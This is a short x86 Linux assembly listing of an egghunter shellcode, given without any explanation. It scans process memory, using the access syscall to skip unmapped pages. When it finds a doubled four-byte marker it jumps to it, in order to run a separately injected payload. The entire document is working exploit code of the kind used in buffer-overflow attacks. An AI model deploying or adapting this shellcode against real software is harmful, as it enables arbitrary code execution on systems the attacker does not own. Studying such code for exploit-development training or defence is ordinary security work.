global _start
section .text
    _start:                 ; Make sure direction flag isn't set
        jmp short call_shellcode

     prep:
        pop edx
        cld

     pageloop:
        or dx, 0xfff

     mainloop:
        inc edx
        lea ebx, [edx+0x4]
        push byte 0x21
        pop eax
        int 0x80
        cmp al, 0xf2
        jz pageloop
        mov eax, 0x90509050
        mov edi, edx
        scasd
        jnz mainloop
        scasd
        jnz mainloop
        jmp edi

    call_shellcode:
        call prep



